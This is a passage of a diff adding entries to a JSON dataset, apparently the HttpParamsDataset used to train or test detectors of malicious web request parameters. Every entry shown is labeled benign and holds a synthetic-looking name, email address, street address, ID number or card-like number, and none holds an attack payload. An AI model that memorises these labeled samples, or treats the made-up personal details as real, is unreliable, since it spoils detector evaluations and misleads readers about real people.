+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "stoeckel@hacia.sa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "tossa de mar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rescisorio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "valdemaluque",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "masahiro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "humfrey",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "brines grimalda",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle hernan cortes, 58,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "38i2t702",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ reina del cielo 136, 8-d",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "09ca93a4i9lar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "70p89c9cion958",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "drozdek.waechter@tarifasdevuelos.bj",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "villacastn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "hans",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "30666350j",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "12965",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vivie4",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "colosse@velaconsultores.gob",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fuente de pedro naharro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "inusitado",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "69557398q",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "beilul",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "hadel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "brivio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ansa-sobrarbe",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rebalg1r",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "88426780z",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "34111",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2268",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "47355557y",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5393761266970595",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "leonila",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "49511678s",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "08191",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rosoli",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  }
+]
